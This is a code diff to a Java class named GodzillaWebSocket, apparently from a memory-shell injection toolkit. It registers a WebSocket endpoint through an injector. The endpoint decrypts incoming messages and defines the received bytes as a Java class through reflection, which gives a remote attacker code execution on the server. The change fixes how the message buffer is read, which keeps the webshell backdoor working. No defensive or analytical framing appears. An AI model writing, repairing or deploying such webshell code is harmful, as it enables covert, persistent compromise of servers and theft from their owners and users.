@@ -15,6 +15,8 @@ import java.net.URLClassLoader;
 import java.nio.ByteBuffer;
 
 /**
+ * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
+ *
  * @author ReaJason
  * @since 2025/5/9
  */
@@ -27,7 +29,8 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
     public void onMessage(ByteBuffer byteBuffer) {
         byte[] result = null;
         try {
-            byte[] data = byteBuffer.array();
+            byte[] data = new byte[byteBuffer.remaining()];
+            byteBuffer.get(data);
             data = x(data, false);
             if (payload == null || (data[0] == -54 && data[1] == -2)) {
                 payload = reflectionDefineClass(data);
